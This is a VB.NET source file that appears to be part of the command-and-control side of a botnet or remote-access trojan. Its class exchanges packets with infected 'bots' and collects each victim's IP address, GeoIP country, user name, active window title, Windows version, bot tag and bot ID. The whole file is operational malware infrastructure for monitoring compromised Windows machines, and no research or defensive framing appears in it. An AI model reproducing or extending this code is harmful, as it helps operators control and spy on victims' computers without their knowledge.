Imports System.Net
Imports System.Net.Sockets

Public Class clsInfo
    'Public
    Inherits clsBoneObj

    Private Const INFO_BASIC As Byte = 0
    Private Const INFO_CURRENT_WINDOW As Byte = 1
    Private Const INFO_WINDOW_VERSION As Byte = 2
    Private Const INFO_BOTTAG As Byte = 3
    Private Const INFO_BOTUID As Byte = 4

    Public Sub New(ByVal mConnPool As clsConnection)
        Conn = mConnPool
    End Sub

    Public Overrides Sub OnInit()
        'Init Obj ID
        ObjID = 0

        'Init ClientInfo
        ClientInfo.botID = ""
        ClientInfo.computerUserName = ""
        ClientInfo.countryCode = ""
        ClientInfo.WindowTitle = ""
        ClientInfo.windowVersion = ""

        ClientInfo.IP = Conn.GetStringIPAddr()
        ClientInfo.FirstConnectionTime = DateTime.Now

        Dim getCountryObj As Getcountry = New Getcountry(Application.StartupPath + "\GeoIP.dat")
        ClientInfo.countryCode = getCountryObj.LookupCountryCode(Conn.GetIPAddr())
        'If ClientInfo.countryCode = "--" Then
        'ClientInfo.countryCode = "VN"
        'End If

    End Sub

    Public Overrides Sub OnExit()

    End Sub

    Public Overrides Sub OnPacketArrived(ByVal packet() As Byte)
        Dim ID As Byte = packet(0)
        Dim BinReader As clsArrayBinaryReader = mGlobal.GetBinReaderObj()


        Select Case ID
            Case INFO_BASIC 'Basic Information
                ClientInfo.computerUserName = System.Text.Encoding.Unicode.GetString(BinReader.BufferReadBuffer(packet, 1, packet.Length - 1))
            Case INFO_CURRENT_WINDOW ' Widow tittle
                ClientInfo.WindowTitle = System.Text.Encoding.Unicode.GetString(BinReader.BufferReadBuffer(packet, 1, packet.Length - 1))
            Case INFO_WINDOW_VERSION ' Window version. Would be a lot of if/else
                Dim dwMajorVersion As Integer = packet(1)
                Dim dwMinorVersion As Integer = packet(2)
                If dwMajorVersion = 10 And dwMinorVersion = 0 Then
                    ClientInfo.windowVersion = "Windows 10/Windows Server 2016"
                ElseIf dwMajorVersion = 6 And dwMinorVersion = 3 Then
                    ClientInfo.windowVersion = "Windows 8.1/Windows Server 2012 R2"
                ElseIf dwMajorVersion = 6 And dwMinorVersion = 2 Then
                    ClientInfo.windowVersion = "Windows 8/Windows Server 2012"
                ElseIf dwMajorVersion = 6 And dwMinorVersion = 1 Then
                    ClientInfo.windowVersion = "Windows 7/Windows Server 2008 R2"
                ElseIf dwMajorVersion = 6 And dwMinorVersion = 0 Then
                    ClientInfo.windowVersion = "Windows Vista/Windows Server 2008"
                ElseIf dwMajorVersion = 5 And dwMinorVersion = 2 Then
                    ClientInfo.windowVersion = "Windows XP Professional x64 Edition/Windows Server 2003"
                ElseIf dwMajorVersion = 5 And dwMinorVersion = 1 Then
                    ClientInfo.windowVersion = "Windows XP"
                ElseIf dwMajorVersion = 5 And dwMinorVersion = 0 Then
                    ClientInfo.windowVersion = "Windows 2000"
                Else
                    ClientInfo.windowVersion = "Unknown windows version"
                End If
            Case INFO_BOTTAG ' Bot Tag
                ClientInfo.botTag = System.Text.Encoding.Unicode.GetString(BinReader.BufferReadBuffer(packet, 1, packet.Length - 1))
            Case INFO_BOTUID
                ClientInfo.botID = Hex(BinReader.BufferReadDWORD(packet, 1)).PadLeft(8, "0")
        End Select
    End Sub

    Public Function UpdateClientInfo() As Boolean
        SendGetWindowTitle()
        Return True
    End Function

    Public Function GetClientInfo() As structClientInfo
        Return ClientInfo
    End Function

    'Private
    Private ClientInfo As structClientInfo

    Public Function SendGetWindowTitle() As Boolean
        Dim BinWritter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
        Dim packet As Byte() = {}

        BinWritter.BufferAddByte(packet, 1)
        SendPacket(packet)

        Return True
    End Function

    Public Function SendGetWindowBasicInfo() As Boolean

        Dim BinWritter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
        Dim packet As Byte() = {}

        BinWritter.BufferAddByte(packet, 0)
        SendPacket(packet)

        Return True
    End Function

    Public Function SendGetWindowVersion() As Boolean
        Dim BinWritter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
        Dim packet As Byte() = {}

        BinWritter.BufferAddByte(packet, 2)
        SendPacket(packet)

        Return True
    End Function

    Public Function SendGetBotTag() As Boolean
        Dim BinWritter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
        Dim packet As Byte() = {}

        BinWritter.BufferAddByte(packet, 3)
        SendPacket(packet)

        Return True
    End Function

    Public Function SendGetBotUID() As Boolean
        Dim BinWritter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
        Dim packet As Byte() = {}

        BinWritter.BufferAddByte(packet, 4)
        SendPacket(packet)
        Return True
    End Function
End Class
